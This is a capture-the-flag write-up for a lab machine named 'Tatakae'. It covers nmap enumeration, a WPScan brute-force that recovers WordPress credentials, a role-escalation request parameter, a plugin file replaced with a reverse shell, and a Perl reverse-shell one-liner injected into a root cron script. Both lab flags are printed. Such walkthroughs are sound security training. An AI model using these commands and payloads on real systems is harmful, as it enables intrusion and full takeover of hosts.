# Tatakae

## Enumeration

```bash
└─$ nmap -sV -A -p- -sC -T4 10.10.196.137 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 17:27 BST
Nmap scan report for 10.10.196.137
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)
|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)
|_  256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Eren&#039;s internal rambling &#8211; Blog for eren&#039;s tho...
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.3.2
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Exploitation

### A wordpress website run on it so I use WP-Scan
```bash
└─$ sudo wpscan --url http://10.10.196.137/ -P /usr/share/wordlists/rockyou.txt -U user.txt -t 3
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - armin / bestfriends 
```

### Add "&ure_other_roles=administrator" to the requeste "Update Account" on the wordpress with Burp Suite

### I have changed the plugin 404 with the pentest-monkey reverse shell

### I got a shell as eren

## User FLAG

```cat user.txt``` : EPI{HoMe_wA2_No7H1NG_8U7_A_pEN}

## Privilege Escalation

### Linpeas gave me nothing, but pspy64 yes

### A script run every 2 minutes as root and use the python os library, so I have modified it with a perl command and i got a shell as root
```python
execvp('perl -e 'use Socket;$i="10.8.37.214";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'')
```
## Root FLAG
```bash
cd /root
```
```cat `ls` ``` : EPI{1_h4V3_73H_PhR33D0M_70_C0n71nu3_M0v1N9_pH0rW4RD}
